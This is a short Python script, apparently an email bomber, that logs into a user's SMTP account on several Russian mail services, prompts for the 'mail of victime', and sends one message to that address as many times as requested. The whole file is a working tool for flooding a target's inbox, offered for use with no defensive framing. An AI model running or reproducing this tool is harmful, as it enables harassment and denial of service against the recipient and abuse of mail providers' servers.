import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
def send_mail():
	login = input('Type your mail: ')
	if login.endswith('@mail.ru') == True:
		url = 'smtp.mail.ru'
	elif login.endswith('@yandex.ru') == True:
		url = 'smtp.yandex.ru'
	elif login.endswith('@inbox.ru') == True:
		url = 'smtp.inbox.ru'
	elif login.endswith('@list.ru') == True:
		url = 'smtp.list.ru'
	elif login.endswith('@bk.ru') == True:
		url = 'smtp.bk.ru'
	else:
		url = input('Type URL: ')
	server = smtplib.SMTP_SSL(url, 465)
	password = input('Type password of your mail: ')
	try:
		server.login(login, password)
	except smtplib.SMTPAuthenticationError:
			print('Failed to log in')
	else:
		toaddr = input('Type mail of victime: ')
		topic = input('Type topic: ')
		body = input('Type message: ')
		msg = MIMEMultipart()
		msg['Subject'] = topic
		msg['From'] = login
		msg.attach(MIMEText(body, 'plain'))
		try:
			for i in range(int(input('How many times: '))):
				server.sendmail(login, toaddr, msg.as_string())
				print('Sent ' + str(i + 1) + ' message to ['  + toaddr + ']')
		except smtplib.SMTPRecipientsRefused:
			print('Failed to find [' + toaddr + ']')
		except KeyboardInterrupt:
			print('Aborted')
		except smtplib.SMTPDataError:
			print('Failed to send message to [' + toaddr + ']')
		else:
			print('Done')
		server.quit()
if __name__ == '__main__':
	send_mail()
